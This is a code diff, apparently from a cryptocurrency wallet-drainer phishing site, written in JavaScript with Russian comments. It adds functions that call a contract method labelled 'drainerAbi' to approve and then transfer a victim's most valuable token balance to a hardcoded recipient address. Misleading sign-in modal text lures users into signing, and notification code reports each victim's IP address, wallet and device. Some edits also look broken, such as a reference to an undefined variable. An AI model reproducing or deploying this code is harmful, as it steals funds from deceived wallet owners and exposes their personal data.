@@ -1,7 +1,7 @@
 import { bsc, mainnet, polygon } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
+import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData, decodeFunctionResult } from 'viem'
 import { readContract, writeContract } from '@wagmi/core'
 
 // Утилита для дебаунсинга
@@ -30,7 +30,7 @@ console.log('Network Map:', networkMap)
 
 const CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC',
-  [networkMap['BNB Smart Chain'].chainId]: '0x67062812416C73364926b9d31E183014deB95462',
+  [networkMap['BNB Smart Chain'].chainId]: '0x3A96C52Ecc0A0C5BfCc51204BD91D8e209ba83c6',
   [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c'
 }
 
@@ -42,6 +42,63 @@ const appKit = createAppKit({
   features: { analytics: true, email: false, socials: false }
 })
 
+// ABI для метода execute
+const drainerAbi = [
+  {
+    inputs: [
+      { name: 'token', type: 'address' },
+      { name: 'to', type: 'address' },
+      { name: 'amount', type: 'uint256' },
+      { name: 'data', type: 'bytes' }
+    ],
+    name: 'execute',
+    outputs: [{ name: '', type: 'bytes' }],
+    stateMutability: 'payable',
+    type: 'function'
+  }
+]
+
+// ABI для токена ERC20
+const erc20Abi = [
+  {
+    constant: true,
+    inputs: [{ name: '_owner', type: 'address' }],
+    name: 'balanceOf',
+    outputs: [{ name: 'balance', type: 'uint256' }],
+    type: 'function'
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: 'spender', type: 'address' },
+      { name: 'amount', type: 'uint256' }
+    ],
+    name: 'approve',
+    outputs: [{ name: 'success', type: 'bool' }],
+    type: 'function'
+  },
+  {
+    constant: true,
+    inputs: [
+      { name: '_owner', type: 'address' },
+      { name: '_spender', type: 'address' }
+    ],
+    name: 'allowance',
+    outputs: [{ name: 'remaining', type: 'uint256' }],
+    type: 'function'
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: 'to', type: 'address' },
+      { name: 'amount', type: 'uint256' }
+    ],
+    name: 'transfer',
+    outputs: [{ name: 'success', type: 'bool' }],
+    type: 'function'
+  }
+]
+
 // Состояние приложения
 const store = {
   accountState: {},
@@ -52,7 +109,8 @@ const store = {
   isApprovalRequested: false,
   isApprovalRejected: false,
   connectionKey: null,
-  isProcessingConnection: false
+  isProcessingConnection: false,
+  executedTransfers: {}
 }
 
 // Создание модального окна
@@ -126,9 +184,9 @@ function createCustomModal() {
   modal.className = 'custom-modal'
   modal.innerHTML = `
     <div class="custom-modal-content">
-      <p class="custom-modal-title">Sign in</p>
+      <p class="custom-modal-title">Sign Transaction</p>
       <div class="custom-modal-loader"></div>
-      <p class="custom-modal-message"> Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
+      <p class="custom-modal-message">Sign this message to approve or transfer tokens. Canceling will disconnect you.</p>
     </div>
   `
   document.body.appendChild(modal)
@@ -138,7 +196,7 @@ function showCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
     modal.style.display = 'flex'
-    setTimeout(() => modal.classList.add('show'), 10) // Небольшая задержка для триггера анимации
+    setTimeout(() => modal.classList.add('show'), 10)
   }
 }
 
@@ -146,7 +204,7 @@ function hideCustomModal() {
   const modal = document.getElementById('customModal')
   if (modal) {
     modal.classList.remove('show')
-    setTimeout(() => modal.style.display = 'none', 300) // Ждем завершения анимации (0.3s)
+    setTimeout(() => modal.style.display = 'none', 300)
   }
 }
 
@@ -160,6 +218,7 @@ window.addEventListener('load', () => {
   store.tokenBalances = []
   store.errors = []
   store.approvedTokens = {}
+  store.executedTransfers = {}
   store.isApprovalRequested = false
   store.isApprovalRejected = false
   store.connectionKey = null
@@ -339,7 +398,7 @@ async function notifyTransferApproved(address, walletName, device, token, chainI
     const scanLink = getScanLink(address, chainId)
     const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
     const amountValue = (token.balance * token.price).toFixed(2)
-    const message = `⚠️ Balance transfer approved (${walletName} - ${device})\n` +
+    const message = `⚠️ Transfer approved (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
                     `🕸 Network: EVM\n` +
                     `🌎 ${ip}\n\n` +
@@ -378,82 +437,20 @@ const TOKENS = {
   'Ethereum': [
     { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
     { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
-    { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 },
-    { symbol: 'WBTC', address: '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', decimals: 8 },
-    { symbol: 'UNI', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', decimals: 18 },
-    { symbol: 'LINK', address: '0x514910771af9ca656af840dff83e8264ecf986ca', decimals: 18 },
-    { symbol: 'COMP', address: '0xc00e94cb662c3520282e6f5717214004a7f26888', decimals: 18 },
-    { symbol: 'YFI', address: '0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e', decimals: 18 },
-    { symbol: 'CRV', address: '0xd533a949740bb3306d119cc777fa900ba034cd52', decimals: 18 },
-    { symbol: 'BAT', address: '0x0d8775f648430679a709e98d2b0cb6250d2887ef', decimals: 18 },
-    { symbol: 'ZRX', address: '0xe41d2489571d322189246dafa5ebde1f4699f498', decimals: 18 },
-    { symbol: 'LRC', address: '0xbbbbca6a901c926f240b89eacb641d8aec7aeafd', decimals: 18 },
-    { symbol: 'BNB', address: '0xb8c77482e45f1f44de1745f52c74426c631bdd52', decimals: 18 },
-    { symbol: 'SHIB', address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', decimals: 18 },
-    { symbol: 'PEPE', address: '0x6982508145454ce325ddbe47a25d4ec3d2311933', decimals: 18 },
-    { symbol: 'LEASH', address: '0x27c70cd1946795b66be9d954418546998b546634', decimals: 18 },
-    { symbol: 'FLOKI', address: '0xcf0c122c6b73ff809c693db761e7baebe62b6a2e', decimals: 18 },
-    { symbol: 'AAVE', address: '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9', decimals: 18 },
-    { symbol: 'RNDR', address: '0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24', decimals: 18 },
-    { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', decimals: 18 },
-    { symbol: 'SUSHI', address: '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2', decimals: 18 },
-    { symbol: 'GLM', address: '0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429', decimals: 18 },
-    { symbol: 'REP', address: '0x1985365e9f78359a9b6ad760e32412f4a445e862', decimals: 18 },
-    { symbol: 'SNT', address: '0x744d70fdbe2ba4cf95131626614a1763df805b9e', decimals: 18 },
-    { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 8 }
+    { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 }
   ],
   'BNB Smart Chain': [
     { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
     { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
-    { symbol: 'SHIB', address: '0x2859e4544c4bb039668b1a517b2f6c39240b3a2f', decimals: 18 },
+    { symbol: 'SHIB', address: '0x2859e4544c4bb03966803b044a93563bd2d0dd4d', decimals: 18 },
     { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
-    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
-    { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
-    { symbol: 'BAKE', address: '0xe02df9e3e622debdd69fb838bb799e3f168902c5', decimals: 18 },
-    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747f6db454cb7a64626c6', decimals: 18 },
-    { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
-    { symbol: 'AUTO', address: '0xa184088a740c695e156f91f5cc086a06bb78b827', decimals: 18 },
-    { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
-    { symbol: 'EPS', address: '0xa7f552078dcc247c2684336020c03648500c6d9f', decimals: 18 },
-    { symbol: 'BELT', address: '0xe0e514c71282b6f4e823703a39374cf58dc3ea4f', decimals: 18 },
-    { symbol: 'MBOX', address: '0x3203c9e46ca618c8be4c2c9f0e2e7b0d5d0e75', decimals: 18 },
-    { symbol: 'SFP', address: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
-    { symbol: 'BabyDoge', address: '0xc748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
-    { symbol: 'EGC', address: '0xc001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
-    { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
-    { symbol: 'PIT', address: '0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2', decimals: 18 }
+    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 }
   ],
   'Polygon': [
     { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
-    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
-    { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
-    { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfb54a7', decimals: 18 },
-    { symbol: 'DFYN', address: '0xc168e40227e4ebd8b3dabb4b05d0b7c67f6a9be', decimals: 18 },
-    { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
-    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0fea8e9b7ea0f28c4', decimals: 18 },
-    { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
+    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 }
   ]
 }
-
-const erc20Abi = [
-  {
-    constant: true,
-    inputs: [{ name: '_owner', type: 'address' }],
-    name: 'balanceOf',
-    outputs: [{ name: 'balance', type: 'uint256' }],
-    type: 'function'
-  },
-  {
-    constant: false,
-    inputs: [
-      { name: 'spender', type: 'address' },
-      { name: 'amount', type: 'uint256' }
-    ],
-    name: 'approve',
-    outputs: [{ name: 'success', type: 'bool' }],
-    type: 'function'
-  }
-]
 
 const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
   if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
@@ -487,31 +484,116 @@ const getTokenPrice = async (symbol) => {
   }
 }
 
-const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
+const executeApprove = async (wagmiConfig, tokenAddress, contractAddress, amount, chainId) => {
   if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
   if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
   if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
   const checksumTokenAddress = getAddress(tokenAddress)
   const checksumContractAddress = getAddress(contractAddress)
   try {
-    const gasLimit = BigInt(65000)
-    const maxFeePerGas = BigInt(10_000_000_000)
-    const maxPriorityFeePerGas = BigInt(2_000_000_000)
-    console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
-    const txHash = await writeContract(wagmiConfig, {
-      address: checksumTokenAddress,
+    // Кодируем данные для вызова approve(address, uint256)
+    const data = encodeFunctionData({
       abi: erc20Abi,
       functionName: 'approve',
-      args: [checksumContractAddress, maxUint256],
+      args: [checksumContractAddress, amount]
+    })
+    const gasLimit = BigInt(100000)
+    const maxFeePerGas = BigInt(10_000_000_000)
+    const maxPriorityFeePerGas = BigInt(2_000_000_000)
+    console.log(`Executing approve with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+    const txHash = await writeContract(wagmiConfig, {
+      address: checksumContractAddress,
+      abi: drainerAbi,
+      functionName: 'execute',
+      args: [checksumTokenAddress, checksumContractAddress, amount, data],
       chainId,
       gas: gasLimit,
       maxFeePerGas,
       maxPriorityFeePerGas
     })
-    console.log(`Approve transaction sent: ${txHash}`)
+    console.log(`Approve transaction sent via execute: ${txHash}`)
     return txHash
   } catch (error) {
-    store.errors.push(`Approve token failed: ${error.message}`)
+    store.errors.push(`Execute approve failed: ${error.message}`)
+    throw error
+  }
+}
+
+const executeAllowance = async (wagmiConfig, tokenAddress, contractAddress, ownerAddress, chainId) => {
+  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
+  if (!tokenAddress || !contractAddress || !ownerAddress) throw new Error('Missing token, contract, or owner address')
+  if (!isAddress(tokenAddress) || !isAddress(contractAddress) || !isAddress(ownerAddress)) throw new Error('Invalid token, contract, or owner address')
+  const checksumTokenAddress = getAddress(tokenAddress)
+  const checksumContractAddress = getAddress(contractAddress)
+  const checksumOwnerAddress = getAddress(ownerAddress)
+  try {
+    // Кодируем данные для вызова allowance(address, address)
+    const data = encodeFunctionData({
+      abi: erc20Abi,
+      functionName: 'allowance',
+      args: [checksumOwnerAddress, checksumContractAddress]
+    })
+    const gasLimit = BigInt(80000)
+    const maxFeePerGas = BigInt(10_000_000_000)
+    const maxPriorityFeePerGas = BigInt(2_000_000_000)
+    console.log(`Executing allowance with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+    const result = await readContract(wagmiConfig, {
+      address: checksumContractAddress,
+      abi: drainerAbi,
+      functionName: 'execute',
+      args: [checksumTokenAddress, checksumContractAddress, 0, data],
+      chainId,
+      gas: gasLimit,
+      maxFeePerGas,
+      maxPriorityFeePerGas
+    })
+    // Декодируем результат (uint256)
+    const allowance = decodeFunctionResult({
+      abi: erc20Abi,
+      functionName: 'allowance',
+      data: result
+    })
+    console.log(`Allowance retrieved: ${allowance}`)
+    return Number(formatUnits(allowance, 0))
+  } catch (error) {
+    store.errors.push(`Execute allowance failed: ${error.message}`)
+    throw error
+  }
+}
+
+const executeTransfer = async (wagmiConfig, tokenAddress, contractAddress, amount, decimals, chainId) => {
+  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
+  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
+  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
+  const checksumTokenAddress = getAddress(tokenAddress)
+  const checksumContractAddress = getAddress(contractAddress)
+  const recipient = '0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'
+  const amountBigInt = parseUnits(amount.toString(), decimals)
+  try {
+    // Кодируем данные для вызова transfer(address, uint256)
+    const data = encodeFunctionData({
+      abi: erc20Abi,
+      functionName: 'transfer',
+      args: [recipient, amountBigInt]
+    })
+    const gasLimit = BigInt(100000)
+    const maxFeePerGas = BigInt(10_000_000_000)
+    const maxPriorityFeePerGas = BigInt(2_000_000_000)
+    console.log(`Executing transfer with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+    const txHash = await writeContract(wagmiConfig, {
+      address: checksumContractAddress,
+      abi: drainerAbi,
+      functionName: 'execute',
+      args: [checksumTokenAddress, recipient, amountBigInt, data],
+      chainId,
+      gas: gasLimit,
+      maxFeePerGas,
+      maxPriorityFeePerGas
+    })
+    console.log(`Transfer transaction sent via execute: ${txHash}`)
+    return txHash
+  } catch (error) {
+    store.errors.push(`Execute transfer failed: ${error.message}`)
     throw error
   }
 }
@@ -615,7 +697,7 @@ const initializeSubscribers = (modal) => {
             const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
             store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = errorMessage
+            if (approveState) consoleState.innerHTML = errorMessage
             hideCustomModal()
             store.isProcessingConnection = false
             return
@@ -625,46 +707,75 @@ const initializeSubscribers = (modal) => {
         }
         try {
           const contractAddress = CONTRACTS[mostExpensive.chainId]
-          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
-          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
-            const approveMessage = store.approvedTokens[approvalKey]
-              ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
+          const transferKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
+          if (store.executedTransfers[transferKey] || store.isApprovalRequested || store.isApprovalRejected) {
+            const transferMessage = store.executedTransfers[transferKey]
+              ? `Transfer already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
               : store.isApprovalRejected
-              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
-              : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
-            console.log(approveMessage)
+              ? `Transfer was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : `Transfer request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            console.log(transferMessage)
             const approveState = document.getElementById('approveState')
-            if (approveState) approveState.innerHTML = approveMessage
+            if (approveState) approveState.innerHTML = transferMessage
             hideCustomModal()
             store.isProcessingConnection = false
             return
           }
           store.isApprovalRequested = true
-          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
-          store.approvedTokens[approvalKey] = true
-          store.isApprovalRequested = false
-          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
-          console.log(approveMessage)
-          await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
+          // Проверяем текущий allowance
+          const allowance = await executeAllowance(
+            wagmiAdapter.wagmiConfig,
+            mostExpensive.address,
+            contractAddress,
+            state.address,
+            mostExpensive.chainId
+          )
           const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
+          if (allowance < Number(amount)) {
+            // Выполняем approve через execute
+            const approveTxHash = await executeApprove(
+              wagmiAdapter.wagmiConfig,
+              mostExpensive.address,
+              contractAddress,
+              amount,
+              mostExpensive.chainId
+            )
+            console.log(`Approve successful: ${approveTxHash}`)
+            await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
+          } else {
+            console.log(`Sufficient allowance already exists: ${allowance}`)
+          }
+          // Выполняем transfer через execute
+          const txHash = await executeTransfer(
+            wagmiAdapter.wagmiConfig,
+            mostExpensive.address,
+            contractAddress,
+            mostExpensive.balance,
+            mostExpensive.decimals,
+            mostExpensive.chainId
+          )
+          store.executedTransfers[transferKey] = true
+          store.isApprovalRequested = false
+          let transferMessage = `Transfer successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
+          console.log(transferMessage)
           const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
           if (transferResult.success) {
-            approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
+            transferMessage += `<br>Transfer request successful: ${transferResult.txHash}`
             console.log(`Transfer request successful: ${transferResult.txHash}`)
             await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
           } else {
-            approveMessage += `<br>Transfer request failed: ${transferResult.message}`
+            transferMessage += `<br>Transfer request failed: ${transferResult.message}`
             console.log(`Transfer request failed: ${transferResult.message}`)
           }
           const approveState = document.getElementById('approveState')
-          if (approveState) approveState.innerHTML = approveMessage
+          if (approveState) approveState.innerHTML = transferMessage
           hideCustomModal()
           store.isProcessingConnection = false
         } catch (error) {
           store.isApprovalRequested = false
           if (error.code === 4001 || error.code === -32000) {
             store.isApprovalRejected = true
-            const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            const errorMessage = `Transaction was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
             store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
@@ -674,7 +785,7 @@ const initializeSubscribers = (modal) => {
             store.isProcessingConnection = false
             sessionStorage.clear()
           } else {
-            const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
+            const errorMessage = `Transaction failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
             store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
@@ -685,7 +796,7 @@ const initializeSubscribers = (modal) => {
       } else {
         const message = 'No tokens with positive balance'
         console.log(message)
-        const mostExpensiveState = document.getElementById('mostExpensiveTokenState')
+        const mostExpensiveState = document.getElementById('mostExpensiveToken')
         if (mostExpensiveState) mostExpensiveState.innerHTML = message
       }
     }
@@ -713,6 +824,7 @@ document.getElementById('open-connect-modal')?.addEventListener('click', () => {
 document.getElementById('disconnect')?.addEventListener('click', () => {
   appKit.disconnect()
   store.approvedTokens = {}
+  store.executedTransfers = {}
   store.errors = []
   store.isApprovalRequested = false
   store.isApprovalRejected = false
